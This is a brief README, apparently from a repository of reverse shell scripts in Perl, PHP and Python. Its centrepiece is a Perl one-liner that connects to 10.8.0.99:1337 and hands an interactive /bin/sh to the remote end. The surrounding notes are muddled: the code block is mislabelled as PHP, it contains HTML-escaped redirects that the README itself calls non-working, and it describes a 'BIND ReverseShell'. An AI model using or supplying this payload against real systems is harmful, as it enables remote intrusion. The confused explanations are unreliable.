# ReverseShellScript (Not mine script)
Reverse Shell script : PERL , PHP , PYTHON
___

ReverseShell.pl
```>&S``` is the correct command to redirect data to socket ```S```.
```php
perl -e 'use Socket;$i="10.8.0.99";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
```


ReverseShell2.pl
```&gt;&amp;S``` is an encoded format that does not work in Perl or shell. (Its output will be sent out in HTML tags.)

ReverseShell3.pl
for BIND ReverseShell ;)

